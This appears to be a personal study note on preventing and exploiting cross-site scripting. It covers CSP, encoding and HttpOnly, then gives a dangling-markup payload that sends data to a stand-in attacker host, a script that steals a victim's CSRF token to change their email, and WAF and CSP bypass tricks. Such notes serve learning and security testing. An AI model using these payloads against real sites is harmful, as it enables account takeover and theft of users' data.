# How to prevent XSS:

To prevent XSS in HTTP responses that aren't intended to contain any HTML or JavaScript, you can use 
the **Content-Type** and **X-Content-Type-Options** headers to ensure that browsers interpret the responses in the way you intend.
Use **Content Security Policy(CSP)** to reduce the severity of any XSS vulnerabilities that still can occur. 

# CSP Example
```
Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'; frame-src 'none'; base-uri 'none';
```
CSP often block script resources, but allow img element to make requests.
CSP protect also from clickjacking.

# Content-Type explaination: 
XSS only applies to documents that are capable of running active script content in the first place.

A page with the MIME type application/json can't contain active content. To the browser it's just data. The situation would be similar with text/plain, 
text/javascript, image/jpeg, etc.

XSS would be possible with a MIME type of e.g. text/html, image/svg+xml, text/xml and many others. In some cases, vendor-related types such as 
application/x-shockwave-flash may have an XSS potential, too.

# Encode Output Data and validate input:

In an HTML context, you should convert non-whitelisted values into HTML entities:

    < converts to: &lt;
    > converts to: &gt;

In a JavaScript string context, non-alphanumeric values should be Unicode-escaped:

    < converts to: \u003c
    > converts to: \u003e

If a user can supply Javascript on the URL, validate the input to be sure that it use a safe protocol.
They can use harmful protocol like javascript and data.

Don't try to do a blacklist.

# Template engine:

There are some server side template engine that defines they're own way to escape. Ex:
```
{{ user.firstname | e('html') }}
```
## HttpOnly
```
HttpOnlySet-Cookie: sessionid=QmFieWxvbiA1; HttpOnly
```
If the HttpOnly flag is included in the HTTP response header, the cookie cannot be accessed through client side script (if the browser supports this flag).
Using the HttpOnly flag when generating a cookie helps mitigate the risk of client side script accessing the protected cookie.

## Dangling markup injection
Dangling markup injection is a technique for capturing data cross-domain in situations where a full cross-site scripting attack isn't possible.

Suppose an application embeds attacker-controllable data into its responses in an unsafe way:
```
<input type="text" name="input" value="CONTROLLABLE DATA HERE">
```
In this situation, an attacker would naturally attempt to perform XSS. But suppose that a regular XSS attack is not possible, due to input filters, 
content security policy, or other obstacles. Here, it might still be possible to deliver a dangling markup injection attack using a payload like the following:
```
"><img src='//attacker-website.com?
```
Note that the attacker's payload doesn't close the src attribute, which is left "dangling". When a browser parses the response, 
it will look ahead until it encounters a single quotation mark toterminate the attribute. 
Everything up until that character will be treated as being part of the URL and will be sent to the attacker's server within the URL query string. 
Any non-alphanumeric characters, including newlines, will be URL-encoded.

The consequence of the attack is that the attacker can capture part of the application's response following the injection point, which might contain sensitive data. 
Depending on the application's functionality, this might include CSRF tokens, email messages, or financial data.

Any attribute that makes an external request can be used for dangling markup. 

## XSS Payload

-You can execute JS in href att. with **javascript:** ex:
```
javascript:alert(1)
```
-Try to use ```; alert() ;``` to inject XSS on Javascript.
Result:
``` 
    <script>
            var searchTerms = 'something'; alert(1) ; var myvar = '1';
            document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
    </script>
```

# CSRF using XSS: 
```
<script>
var req = new XMLHttpRequest();//It depends on the api, you can try with fetch()
req.onload = handleResponse;
req.open('get','/data',true);
req.send();
function handleResponse() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1]; //take the users CSRF token
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/data/form', true);
    changeReq.send('csrf='+token+'&email=test@test.com') //Append CSRF token and change email
};
</script>
```
# Other Bypass

-You can try to bypass html escape with the svg element.(That defines vector-based graphics)

-If the WAF prevents your requests from reaching the website, you can try to throw an exception:
```
onerror=alert;throw 1
```
-When the browser has parsed out the HTML tags and attributes within a response, it will perform HTML-decoding of tag attribute values before they are processed any further.
You can try to bypass input validation HTML encoding the special carachters. 
```
&apos;
```
will be converted to
```
"
```
 and you will bypass the validation. 

-Sometimes you can find the report-uri header, that reflect the actual policy of CSP.
Inject a valid script-src-elem can bypass the CSP overwriting existing script-src directives.

# Common sources(where the code take your's input):
```
document.URL
document.documentURI
document.URLUnencoded
document.baseURI
location
document.cookie
document.referrer
window.name
history.pushState
history.replaceState
localStorage
sessionStorage
```

# Common sink:
```
document.write()
window.location
document.cookie
eval()
document.domain
WebSocket()
element.src
postMessage()
setRequestHeader()  (for Ajax request-header manipulation)
JSON.parse()
```
